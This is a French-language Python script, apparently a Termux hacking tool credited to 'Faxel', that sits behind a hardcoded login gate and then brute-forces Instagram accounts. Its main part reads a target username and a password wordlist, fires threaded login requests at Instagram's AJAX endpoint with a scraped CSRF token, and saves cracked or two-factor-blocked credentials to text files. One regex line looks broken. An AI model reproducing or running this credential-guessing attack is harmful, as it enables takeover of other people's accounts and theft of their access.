#!/usr/bin/python3
#coding=utf-8
#cd /data/data/com.termux/files/usr/bin/.session
################################# Credits ##########################################################
# Contact: t.me/Faxelh
# Le credit pour ce code va a Mr Faxel
# Vous pouvez recoder , mais toute fois mentionner le nom de l'auteur merci boss.
# xdg-open https://www.youtube.com/c/FASTERAXEL?sub_confirmation=1
#    CheckVersion = str(sys.version)
raw_input = input
####################################################################################################
# -Effacer le systeme en question-#
import os
def cls():
    os.system('clear')
####################################################################################################
logo_faxel =("""\033[38;5;247m╭━╮╭━╮╱╱\033[38;5;214m╭━━━╮╱╱╱╱╱╱╱╱╭╮\n\033[38;5;247m┃┃╰╯┃┃╱╱\033[38;5;214m┃╭━━╯╱╱╱╱╱╱╱╱┃┃\n\033[38;5;247m┃╭╮╭╮┣━╮\033[38;5;214m┃╰━━┳━━┳╮╭┳━━┫┃\n\033[38;5;247m┃┃┃┃┃┃╭╯\033[38;5;214m┃╭━━┫╭╮┣╋╋┫┃━┫┃\n\033[38;5;247m┃┃┃┃┃┃┃╱\033[38;5;214m┃┃╱╱┃╭╮┣╋╋┫┃━┫╰╮\n\033[38;5;247m╰╯╰╯╰┻╯╱\033[38;5;214m╰╯╱╱╰╯╰┻╯╰┻━━┻━╯""")
logo_sec =("""\x1b[1;32m╭━━━╮╱╱╱╱╱╱╱╱╱╱╱╭╮╱╱╱╱╱\033[38;5;214m ╭━━━╮╱╱╱╱╱╱╱╱╭╮\n\x1b[1;32m┃╭━╮┃╱╱╱╱╱╱╱╱╱╱╭╯╰╮╱╱╱╱\033[38;5;214m ┃╭━━╯╱╱╱╱╱╱╱╱┃┃\n\x1b[1;32m┃╰━━┳━━┳━━┳╮╭┳━╋╮╭╋╮╱╭╮\033[38;5;214m ┃╰━━┳━━┳╮╭┳━━┫┃\n\x1b[1;32m╰━━╮┃┃━┫╭━┫┃┃┃╭╋┫┃┃┃╱┃┃\033[38;5;214m ┃╭━━┫╭╮┣╋╋┫┃━┫┃\n\x1b[1;32m┃╰━╯┃┃━┫╰━┫╰╯┃┃┃┃╰┫╰━╯┃\033[38;5;214m ┃┃╱╱┃╭╮┣╋╋┫┃━┫╰╮\n\x1b[1;32m╰━━━┻━━┻━━┻━━┻╯╰┻━┻━╮╭╯\033[38;5;214m ╰╯╱╱╰╯╰┻╯╰┻━━┻━╯\n\x1b[1;32m╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━╯┃\n\x1b[1;32m╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰━━╯\n\033[1;97m╔═════════════════════════════════════════════╗\n\033[1;97m║\033[1;91m[\033[1;93m**\033[1;91m]\033[38;5;95m      Developpeur \033[1;97m:\033[38;5;214m  Faxel           \033[1;91m[\033[1;93m**\033[1;91m]\033[1;97m║\n\033[1;97m╚═════════════════════════════════════════════╝""")
logo_faxel =("""\033[38;5;214m──\033[38;5;125m▄\033[38;5;214m────\033[38;5;125m▄▄▄▄▄▄▄\033[38;5;214m────\033[38;5;125m▄\033[38;5;214m───\n\033[38;5;214m─\033[38;5;125m▀▀▄\033[38;5;214m─\033[38;5;125m▄█████████▄\033[38;5;214m─\033[38;5;125m▄▀▀\033[38;5;214m──\n\033[38;5;214m─────\033[38;5;125m██\033[38;5;214m─\033[38;5;125m▀███▀\033[38;5;214m─\033[38;5;214m██\033[38;5;214m──────\n\033[38;5;214m───\033[38;5;125m▄\033[38;5;214m─\033[38;5;125m▀████▀████▀\033[38;5;214m─\033[38;5;125m▄\033[38;5;214m────\n\033[38;5;214m─\033[38;5;125m▀█\033[38;5;214m────\033[38;5;125m██▀█▀██\033[38;5;214m────\033[38;5;125m█▀\033[38;5;214m──\n\033[38;5;214m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█\n\033[38;5;214m█░░\033[38;5;245m╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗\033[38;5;214m░░█\n\033[38;5;214m█░░\033[38;5;245m║║║╠─║─║─║║║║║╠─\033[38;5;214m░░█\n\033[38;5;214m█░░\033[38;5;245m╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝\033[38;5;214m░░█\n\033[38;5;214m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█\n\033[1;37mLa gestion dépend du logiciel VPN. Veuillez l'utiliser avant d'exécuter l'outil""")####################################################################################################
####################################################################################################
# -Importation des modules- #
try:
    import os,time,sys,re,fileinput,random,requests,mechanize,bs4,datetime,threading
    from random import randint
    from six.moves import input
    from datetime import datetime
    print("\033[1;92m Exigences disponibles")
    cls()
except:
    cls()
    print("\033[1;96m Configuration requise pour l'installation....\033[1;97m\n")
    os.system('pip3 install requests')
    os.system('pip3 install mechanize')
    os.system('pip3 install bs4')
    cls()
####################################################################################################
if sys.version[0] in '2':
    cls()
    print(logo_faxel)
    exit("\n\t\033[1;91m[\033[1;93m*\033[1;91m]\033[1;97m Vous ne pouvez pas utiliser\033[1;95m python2\033[1;97m pour executer ce script\033[1;97m.\n\t\033[1;91m[\033[1;93m*\033[1;91m]\033[1;97m Veuillez l'executer en tapant \033[38;5;247mpython3\n")
####################################################################################################
####################################################################################################
# -Automatisation-#
def mael(f):
    for l in f + '\n':
        sys.stdout.write(l)
        sys.stdout.flush()
        time.sleep(0.009)
####################################################################################################        
# -La date du jours courant-#
def horaire():
    os.system('date | lolcat')
    #print("\t\033[38;5;214m \033[1;31m  [\033[1;37m++\033[1;31m]\033[042m \033[1;37m Codé par\033[1;31m : \033[38;5;245m Mr \033[38;5;247mFaxel\033[1;31m [\033[1;37m++\033[1;31m] \033[00m")		
####################################################################################################
# -Animation a ma deuxieme methode-#
t = 0.15
def anime(f):
    for g in f:
        sys.stdout.write(g)
        sys.stdout.flush()
        time.sleep(t)
####################################################################################################
# -Animation a ma troisieme methode-#
def periode():
   periodique = ['.','..','...','....','.....']
   for o in periodique:
     print("\r\033[1;91m[●] \033[1;92mChargement en cours\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)		
####################################################################################################	
########## -Au revoir- ##########
def quitter():
    sys.exit()   
####################################################################################################	
########## -Arret animer- ##########
def arret():
    mael("\033[1;97m╔══╗─────╔╗───────────────╔═╗")
    mael("\033[1;97m║╔╗╠╦╦╦╦═╣╚╗╔═╦═╦╗╔═╦═╦╦╦╦╣═╣")
    mael("\033[1;91m║╠╣║╔╣╔╣╩╣╔╣║╩╣║║║║═╣╬║║║╔╬═║")
    mael("\033[1;91m╚╝╚╩╝╚╝╚═╩═╝╚═╩╩═╝╚═╩═╩═╩╝╚═╝")
    mael('\033[1;97m▒▒▒▒▒▒▒▒▒▒')
    print("\033[1;32m0%")
    mael('\033[1;97m█▒▒▒▒▒▒▒▒▒')
    print("\033[1;32m10%")
    mael('\033[1;97m███▒▒▒▒▒▒▒')
    print("\033[1;32m30%")
    mael('\033[1;97m█████▒▒▒▒▒')
    print("\033[1;32m50%")
    mael('\033[1;97m███████▒▒▒')
    print("\033[1;32m80%")
    mael('\033[1;97m██████████')
    print("\033[1;32m100%")
    mael("\n\033[1;97mBye Mec, j\'espere que tu as adorée le script de\033[1;91m Mr \033[1;96mFaxel\033[1;97m.A bientot!!\n")
    quitter()
####################################################################################################
# -Chargement a ma deuxieme methode-#
def load(mot):
    chaine = [
     '/', '-', '|']
    for i in range(5):
        for x in range(len(chaine)):
            sys.stdout.write(('\r{}{}').format(str(mot), chaine[x]))
            time.sleep(0.3)
            sys.stdout.flush()
####################################################################################################  
# -Chargement a ma premiere methode-#
def charge():
    compteur = ["1","2","3","4","5","6","7","8","9","10","11","12","13","14","15","16","17","18","19","20","21","22","23","24","25","26","27","28","29","30","31","32","33","34","35","36","37","38","39","40","41","42","43","44","45","46","47","48","49","50","51","52","53","54","55","56","57","58","59","60","61","62","63","64","65","66","67","68","69","70","71","72","73","74","75","76","77","78","79","80","81","82","83","84","85","86","87","88","89","90","91","92","93","94","95","96","97","98","99","100"]
    print
    for b in compteur:
    	sys.stdout.write("\r\033[1;91m[\033[1;93m*\033[1;91m] \033[38;5;245m@\033[38;5;221mFaxel\033[1;92m "+b+" \033[1;97m%")
    	sys.stdout.flush()
    	time.sleep(0.1)
    time.sleep(1.5)
####################################################################################################
logo_sec =("""\x1b[1;32m╭━━━╮╱╱╱╱╱╱╱╱╱╱╱╭╮╱╱╱╱╱\033[38;5;214m ╭━━━╮╱╱╱╱╱╱╱╱╭╮\n\x1b[1;32m┃╭━╮┃╱╱╱╱╱╱╱╱╱╱╭╯╰╮╱╱╱╱\033[38;5;214m ┃╭━━╯╱╱╱╱╱╱╱╱┃┃\n\x1b[1;32m┃╰━━┳━━┳━━┳╮╭┳━╋╮╭╋╮╱╭╮\033[38;5;214m ┃╰━━┳━━┳╮╭┳━━┫┃\n\x1b[1;32m╰━━╮┃┃━┫╭━┫┃┃┃╭╋┫┃┃┃╱┃┃\033[38;5;214m ┃╭━━┫╭╮┣╋╋┫┃━┫┃\n\x1b[1;32m┃╰━╯┃┃━┫╰━┫╰╯┃┃┃┃╰┫╰━╯┃\033[38;5;214m ┃┃╱╱┃╭╮┣╋╋┫┃━┫╰╮\n\x1b[1;32m╰━━━┻━━┻━━┻━━┻╯╰┻━┻━╮╭╯\033[38;5;214m ╰╯╱╱╰╯╰┻╯╰┻━━┻━╯\n\x1b[1;32m╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━╯┃\n\x1b[1;32m╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰━━╯\n\033[1;97m╔═════════════════════════════════════════════╗\n\033[1;97m║\033[1;91m[\033[1;93m**\033[1;91m]\033[38;5;95m      Developpeur \033[1;97m:\033[38;5;214m  Faxel           \033[1;91m[\033[1;93m**\033[1;91m]\033[1;97m║\n\033[1;97m╚═════════════════════════════════════════════╝""")
logo_kali = ("""\033[38;5;214m    ..,;:ccc,.                          \n\033[38;5;214m          ......''';lxO.                        \n\033[38;5;214m.....''''..........,:ld;                        \n\033[38;5;214m           .';;;:::;,,.x,                       \n\033[38;5;214m      ..'''.            0Xxoc:,.  ...           \n\033[38;5;214m  ....                ,ONkc;,;cokOdc',.         \n\033[38;5;214m .                   OMo           ':'o.       \n\033[38;5;214m                    dMc               :OO;      \n\033[38;5;214m                    0M.                 .:o.    \n\033[38;5;214m                    ;Wd                         \n\033[38;5;214m                     ;XO,                       \n\033[38;5;214m                       ,d0Odlc;,..              \n\033[38;5;214m                           ..',;:cdOOd::,.    \033[1;36m ⓥ①.⑦\n\033[38;5;214m                                    .:d;.':;.   \n\033[38;5;214m                                       'd,  .'  \n\033[38;5;214m                                         ;l   ..\n\033[38;5;214m                  \n\033[38;5;247m          🅵🅰🆇🅴🅻                         \033[38;5;214m.o    \n                                            c   \n\033[38;5;214m                                             .' \n\033[38;5;214m                                             .  """)
####################################################################################################
nav = mechanize.Browser()
nav.set_handle_equiv(True)
nav.set_handle_gzip(True)
nav.set_handle_redirect(True)
nav.set_handle_referer(True)
nav.set_handle_robots(False)
nav._factory.is_html = True
nav.addheaders = [('User-agent',
                 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/45.0.2454101'
                 )]
####################################################################################################
def security():
    cls()
    horaire()
    print(logo_sec)
    nom_u = "Faxel"
    mdp = "08127934"
    print("\033[1;97m║")
    user = raw_input("\033[1;97m╬═\033[1;31m▶\033[38;5;245m NOM D'UTILISATEUR \033[1;97m═╬══\033[1;91m► \033[1;92m")
    if user == nom_u:
        pass
    elif not user == nom_u:
        print ("\n\033[1;91m[\033[1;93m*\033[1;91m]\033[1;95m Nom d'utilisateur incorrect!")
        os.system('xdg-open https://wa.me/22555709610')
        security()
    print("\033[1;97m║")
    mot_passant = raw_input("\033[1;97m╬═\033[1;31m▶\033[38;5;245m MOT DE PASSE      \033[1;97m═╬══\033[1;91m► \033[1;93m")
    print("\033[1;97m╚═════════════════════════════════════════════╝")
    if mot_passant == mdp:
        load("\033[1;91m[\033[1;92m@\033[1;91m]\033[38;5;245m Server\033[38;5;214m Faxel\033[38;5;241m...\033[48;5;0;38;5;192m")
        print("\n\033[1;91m[\033[1;92m●\033[1;91m]\033[1;97m Connecté en tant que \033[1;96m" + nom_u) #Dev:Faxel
        verifie()
    elif not mot_passant == mdp:
        print ("\n\033[1;91m[\033[1;93m*\033[1;91m]\033[1;95m Mot de passe incorrect!")
        os.system('xdg-open https://t.me/Faxelh')
        security()
####################################################################################################
def connection(url='http://www.google.com/', timeout=3):
    try:
        cls()
        verficateur_connexion = requests.get(url, timeout=timeout)
        verficateur_connexion.raise_for_status()
        load("\033[1;91m[\033[1;92m●\033[1;91m]\033[1;97m Verification de la connexion\033[1;92m...")
        cls()
        print(logo_kali)
        mael("\n\t\t\033[1;92mVous êtes connecté à Internet\n")
        raw_input("\t\t\033[1;91m[[38;5;24mSuivant\033[1;91m]")
        return True
    except requests.HTTPError as e:
        print("\033[1;31m[\033[1;33m+\033[1;31m]\033[1;37m La vérification de la connexion Internet a échoué, code d'état {0}.".format(e.response.status_code))
    except requests.ConnectionError:
        mael("\t\t\033[1;91mVous n'êtes pas connecté à Internet.")
    return False
####################################################################################################
def verifie():
    if connection() == True:
         Force_brute_insta()
    else:
         quitter()
####################################################################################################
class Force_brute_insta(object):
    def __init__(self):
        print(logo_faxel)
        try:
            utilisateur = input('username : ')
            _wordliste = input('passList : ')
            print('\n----------------------------')        
        except:
            print(' The tool was arrested exit ')
            sys.exit()
        with open(_wordliste, 'r') as save:
            _passwordliste = save.read().splitlines()
        fil_general = []
        self.Coutprox = 0
        for word_pass in _passwordliste:
            _mot_de_passe = word_pass.split(':')[0]
            fil_thread = threading.Thread(target=self.Nouvelle_methode, args=(utilisateur, _mot_de_passe))
            fil_thread.start()
            fil_general.append(fil_thread)
            time.sleep(0.9)
        for j in fil_general:
            j.join()
####################################################################################################
    def _cls(self):
        linux = 'clear'
        windows = 'cls'
        os.system([linux, windows][os.name == 'nt'])
####################################################################################################
    def Nouvelle_methode(self,utilisateur,pwd):
        _lien_connexion = 'https://www.instagram.com/accounts/login/'
        _url_connexion = 'https://www.instagram.com/accounts/login/ajax/'
        _temps = int(datetime.now().timestamp())
        _charge_utile = {
            'username': utilisateur,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{_temps}:{pwd}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }
        with requests.Session() as sauve:
            _requete = sauve.get(_lien_connexion)
            _csrf_jeton = re.findall(requete"csrf_token\":\"(.*?)\"", _requete.text)[0]
            _reqs = sauve.post(_url_connexion, data=_charge_utile, headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
                "X-Requested-With": "XMLHttpRequest",
                "Referer": "https://www.instagram.com/accounts/login/",
                "x-csrftoken": _csrf_jeton
            })
            print(f'{utilisateur}:{pwd}\n----------------------------')
    
            if 'authenticated": true' in _reqs.text:
                print(('' + utilisateur + ':' + pwd + ' --> Bien pirater '))
                with open('faxel.txt', 'a') as saves:
                    saves.write(utilisateur + ':' + pwd + '\n')
            elif 'two_factor_required' in _reqs.text:   
                print(('' + utilisateur + ':' + pwd + ' --> Bon il faut vérifier '))
                with open('Faxelh.txt', 'a') as sauves:
                    sauves.write(utilisateur + ':' + pwd + '\n')

####################################################################################################
####################################################################################################            
if __name__ == '__main__':
      security()
####################################################################################################
